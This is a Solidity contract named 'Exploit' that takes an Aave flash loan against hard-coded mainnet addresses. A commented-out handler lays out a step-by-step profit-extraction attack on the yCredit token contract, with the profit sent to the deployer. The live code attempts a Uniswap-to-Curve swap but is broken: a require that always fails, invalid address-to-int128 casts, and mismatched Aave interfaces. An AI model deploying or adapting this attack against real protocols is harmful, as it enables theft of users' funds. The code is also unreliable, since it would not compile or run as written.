pragma solidity ^0.6.0;

import "./aave/FlashLoanReceiverBase.sol";
import "./aave/ILendingPoolAddressesProvider.sol";
import "./aave/ILendingPool.sol";
import "./curveFi/ICurveFi.sol";
import "./uniswap/IUniswapV2Router02.sol";

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface yCredit {
    function deposit(address token, uint amount) external;
    function withdraw(address token, uint amount) external;
}

interface Router {
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
}

contract Exploit is FlashLoanReceiverBase{
    address immutable dev;
    Router constant router = Router(0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F);
    address constant factory = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;
    address constant ycredit = 0xE0839f9b9688a77924208aD509e29952dc660261;
    address constant LENDING_POOL = 0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9;
    address constant dai = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address constant weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant usdt = 0xdAC17F958D2ee523a2206206994597C13D831ec7;

    ILendingPool public lendingPool;
    IUniswapV2Router02 public uniswapV2Router02;
    ICurveFi public curveFi;

    address[] public path;

    address constant curveFi_curve_cDai_cUsdc = 0xA2B47E3D5c44877cca798226B7B8118F9BFb7A56;

    constructor(address _addressProvider)
        public
        FlashLoanReceiverBase(_addressProvider)
    {
        // address lendingPoolAddress = addressesProvider.getLendingPool();
        // //Instantiate Aave Lending Pool
        // lendingPool = ILendingPool(lendingPoolAddress);

        //Instantiate Uniswap V2 router 02
        uniswapV2Router02 = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );

        //Instantiate curveFi
        curveFi = ICurveFi(curveFi_curve_cDai_cUsdc);

        dev = msg.sender;
    }

    // function executeOperation(
    //     address[] calldata assets,
    //     uint256[] calldata amounts,
    //     uint256[] calldata premiums,
    //     address initiator,
    //     bytes calldata params
    // )
    //     public
    //     override
    //     returns (bool)
    // {
    //     address[] memory path = new address[](2);
    //     for (uint i = 0; i < assets.length; i++) {
    //         // 1. deposit asset to ycredit
    //         // IERC20(assets[i]).approve(ycredit, amounts[i] / 2);
    //         // yCredit(ycredit).deposit(assets[i], amounts[i] / 2);
    //         // // 2. swap to ycredit
    //         // path[0] = assets[i];
    //         // path[1] = ycredit;
    //         // IERC20(assets[i]).approve(address(router), amounts[i] / 2);
    //         // router.swapExactTokensForTokens(amounts[i] / 2, 0, path, address(this), block.timestamp);
    //         // // 3. withdraw from ycredit
    //         // yCredit(ycredit).withdraw(assets[i], IERC20(ycredit).balanceOf(address(this)));
    //         // // 4. swap ycredit to asset
    //         // path[0] = ycredit;
    //         // path[1] = assets[i];
    //         // uint amountIn = IERC20(ycredit).balanceOf(address(this));
    //         // IERC20(ycredit).approve(address(router), amountIn);
    //         // router.swapExactTokensForTokens(amountIn, 0, path, address(this), block.timestamp);
    //         // // 5. return the profits
    //         // uint profit = IERC20(assets[i]).balanceOf(address(this)) - amounts[i] - premiums[i];
    //         // IERC20(assets[i]).transfer(dev, profit);
    //         // 6. return the flash loan
    //         IERC20(assets[i]).approve(address(LENDING_POOL), amounts[i] + 10*premiums[i]);
    //     }
    //     return true;
    // }

    function executeOperation(
        address _reserve,
        uint256 _amount,
        uint256 _fee,
        bytes calldata _params
    ) external override {
        require(
            _amount <= getBalanceInternal(address(this), _reserve),
            "Invalid balance, was the flashLoan successful?"
        );
        require(false == true, "yha phata");

        address _tokenB = abi.decode(_params, (address));

        //  * 2. Exchange TokenA with TokenB on Uniswap
        uint256 deadline = getDeadline();
        ERC20 TokenA = ERC20(_reserve);

        require(
            TokenA.approve(address(uniswapV2Router02), _amount),
            "Could not approve TokenA sell"
        );

        path.push(_reserve);
        path.push(_tokenB);

        uint256[] memory tokenBPurchased = uniswapV2Router02
            .swapExactTokensForTokens(
            _amount,
            1,
            path,
            address(this),
            deadline
        );

        //  * 3. Exchange TokenB with TokenA on Curve Finance

        ERC20 TokenB = ERC20(_tokenB);

        require(
            TokenB.approve(address(curveFi), tokenBPurchased[0]),
            "Could not approve TokenB sell"
        );

        curveFi.exchange_underlying(
            int128(_reserve),
            int128(_tokenB),
            tokenBPurchased[0],
            0
        );

        //  * 4. Repay TokenA to Aave
        uint256 totalDebt = _amount.add(_fee);
        require(
            totalDebt <= getBalanceInternal(address(this), _reserve),
            "FlashLoan Fee amount not met."
        );
        transferFundsBackToPoolInternal(_reserve, totalDebt);
    }

    // function myFlashLoanCall() public {
    //     address receiverAddress = address(this);

    //     address[] memory assets = new address[](1);
    //     assets[0] = weth;
    //     // assets[1] = address(INSERT_ASSET_TWO_ADDRESS);

    //     uint256[] memory amounts = new uint256[](1);
    //     amounts[0] = 1000*(10**1);
    //     // amounts[1] = INSERT_ASSET_TWO_AMOUNT;

    //     // 0 = no debt, 1 = stable, 2 = variable
    //     uint256[] memory modes = new uint256[](1);
    //     modes[0] = 0;
    //     // modes[1] = INSERT_ASSET_TWO_MODE;

    //     address onBehalfOf = address(this);
    //     bytes memory params = "";
    //     uint16 referralCode = 0;
    //     ILendingPool(LENDING_POOL).flashLoan(
    //         receiverAddress,
    //         assets,
    //         amounts,
    //         modes,
    //         onBehalfOf,
    //         params,
    //         referralCode
    //     );
    // }

    function myFlashLoanCall(
        address tokenA,
        uint256 amount
    ) public {
        ERC20 TokenA = ERC20(tokenA);
        bytes memory params = "";
        ILendingPool(LENDING_POOL).flashLoan(address(this), tokenA, amount, params);
    }

    function getDeadline() internal view returns (uint256) {
        return block.timestamp + 3000;
    }

}
